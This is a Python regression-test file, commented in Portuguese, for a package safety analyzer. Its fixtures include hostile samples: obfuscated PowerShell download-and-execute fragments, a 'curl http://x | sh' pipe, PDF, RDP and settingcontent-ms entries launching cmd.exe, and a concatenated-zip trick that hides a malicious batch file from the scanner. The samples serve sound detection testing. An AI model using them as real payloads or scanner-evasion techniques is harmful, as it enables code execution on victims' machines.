"""Cenários da segunda rodada (reauditoria R1–R9). Importado por run_regression.py."""
from __future__ import annotations

import time
import zipfile
from pathlib import Path

BS = chr(92)  # barra invertida (evita problemas de escape)


def run_round2(ctx) -> None:
    """ctx expõe: TMP, SEVEN, notepad, DESTRUCTIVE, mkpe, mkzip, analyze, scenario, check, FakeVT, checks."""
    TMP, mkpe, mkzip, analyze, scenario, check = ctx.TMP, ctx.mkpe, ctx.mkzip, ctx.analyze, ctx.scenario, ctx.check
    checks, notepad, FakeVT = ctx.checks, ctx.notepad, ctx.FakeVT
    now = time.time()
    ok_old = {"found": True, "stats": {"malicious": 0, "suspicious": 0, "harmless": 10, "undetected": 70}, "engines": {}, "link": "x",
              "first_seen": now - 400 * 86400}
    new_clean = dict(ok_old, first_seen=now - 2 * 86400)

    # R1: idade do registro no VirusTotal
    f, _ = checks.vt_findings(ok_old, "", True)
    check("R1 VT limpo e antigo (400 dias) => crédito de confiança", f[0].trust, f[0].title)
    f, _ = checks.vt_findings(new_clean, "", True)
    check("R1 VT limpo mas registro de 2 dias ('pré-aquecido') => SEM confiança, vira lacuna", (not f[0].trust) and f[0].gap, f[0].title)
    f, _ = checks.vt_findings(dict(ok_old, first_seen=None), "", True)
    check("R1 VT limpo sem data => sem confiança", not f[0].trust)

    class WarmVT(FakeVT):
        def lookup(self, sha, status=None, cancelled=None):
            return new_clean

    pkg = mkzip("prewarm.zip", {"app.exe": mkpe("w.exe").read_bytes(), "run.ps1": "$a='Down'+'load'+'String';iex ($a)"})
    sr, fin, v = analyze(pkg, WarmVT())
    check("R1 exe + script com VT 'pré-aquecido' (0/70, 2 dias) => não é Seguro", v.level != "safe", f"{v.headline} {v.score}")

    # R2: assinatura não cobre o script ao lado
    sig_pkg = mkzip("sig_script.zip", {"notepad.exe": notepad.read_bytes(),
                                       "extra.ps1": "$x='Net.We'+'bCl'+'ient';$y='Down'+'load'+'Str'+'ing';iex(1)"})
    sr, fin, v = analyze(sig_pkg)
    check("R2 exe assinado + script ofuscado ao lado => não é Seguro", v.level != "safe", f"{v.headline} {v.score}")
    sr, fin, v = analyze(mkzip("so_assinado.zip", {"notepad.exe": notepad.read_bytes()}))
    check("R2 pacote só com exe assinado => continua podendo ser Seguro", v.level == "safe", f"{v.headline} {v.score}")

    # R9: driver
    sr, fin, v = analyze(mkzip("com_driver.zip", {"app.exe": notepad.read_bytes(), "drv.sys": notepad.read_bytes()}))
    check("R9 pacote com driver .sys => não é Seguro (lacuna BYOVD)", v.level != "safe" and any("driver" in f.title.lower() for f in fin), v.headline)

    # R3: formatos ativos
    docs = (
        ("doc.rtf", b"{" + BS.encode() + b"rtf1{" + BS.encode() + b"object" + BS.encode() + b"objemb{" + BS.encode() + b"*" + BS.encode() + b"objdata 0105}}}"),
        ("a.pdf", b"%PDF-1.4 /OpenAction << /S /Launch /F (cmd.exe) >>"),
        ("c.settingcontent-ms", b"<DeepLink>cmd.exe /c calc</DeepLink>"),
        ("c.rdp", b"alternate shell:s:cmd.exe /c evil"),
        ("s.sh", b"curl http://x | sh; powershell -enc " + b"A" * 30),
    )
    for nome, conteudo in docs:
        p = TMP / nome
        p.write_bytes(conteudo)
        scenario(f"R3 {nome} => não é Seguro", {"caution", "danger"}, p)
    scenario("R3 extensão desconhecida (.xyz123) => não é Seguro (tipo não inspecionado)", {"unknown", "caution", "danger"},
             mkzip("estranho.zip", {"dados.xyz123": b"?" * 50, "tex.png": b"PNG...."}), must_have="não reconhecidos")
    scenario("R3 pacote só de texturas/áudio/texto conhecidos continua Seguro", {"safe"},
             mkzip("tudo_inerte.zip", {"a.dds": b"DDS ", "b.ogg": b"OggS", "c.json": "{}", "d.txt": "oi"}))

    # R4: zip concatenado com o malicioso PRIMEIRO (o Python lê o último EOCD e vê só o benigno)
    if Path(ctx.SEVEN).exists():
        mal, ben, cat = TMP / "mal.zip", TMP / "ben.zip", TMP / "concatenado.zip"
        with zipfile.ZipFile(mal, "w") as z:
            z.writestr("p.bat", ctx.DESTRUCTIVE)
        with zipfile.ZipFile(ben, "w") as z:
            z.writestr("leia.txt", "oi")
        cat.write_bytes(mal.read_bytes() + ben.read_bytes())
        scenario("R4 zip concatenado (malicioso primeiro) => Atenção/Perigoso", {"caution", "danger"}, cat)

    # R5: peso único para desconhecidos no VT (jogo indie)
    dlls = {f"lib{i}.dll": mkpe(f"l{i}.dll", sections=[(".text", bytes([i + 1]) * 9000)]).read_bytes() for i in range(8)}
    indie = mkzip("indie.zip", {"jogo.exe": mkpe("j.exe", sections=[(".text", b"A" * 9000)]).read_bytes(), **dlls})
    sr, fin, v = analyze(indie, FakeVT())
    check("R5 jogo indie (1 exe + 8 DLLs) com VT desconhecido: pontuação baixa (<= 20)", v.score <= 20 and v.level != "danger", f"{v.headline} {v.score}")

    # R8: ofuscação detectada
    for nome, texto in (
        ("o1.ps1", "$a='Down'+'load'+'St'+'ri'+'ng'+'x'+'y'; & ($a)"),
        ("o2.bat", "@echo off" + chr(13) + chr(10) + "set a=po" + chr(13) + chr(10) + "%a%%b%%c%%a%%b% -c x" + chr(13) + chr(10)),
        ("o3.ps1", "[char]100+[char]111+[char]119+[char]110; powershell -ec " + "QUJD" * 10),
    ):
        p = TMP / nome
        p.write_text(texto, encoding="ascii")
        sr, fin, v = analyze(p)
        check(f"R8 ofuscação {nome} é detectada e não é Seguro",
              any(x.stage == "static" and x.points > 0 for x in fin) and v.level != "safe", f"{v.headline} {v.score}")
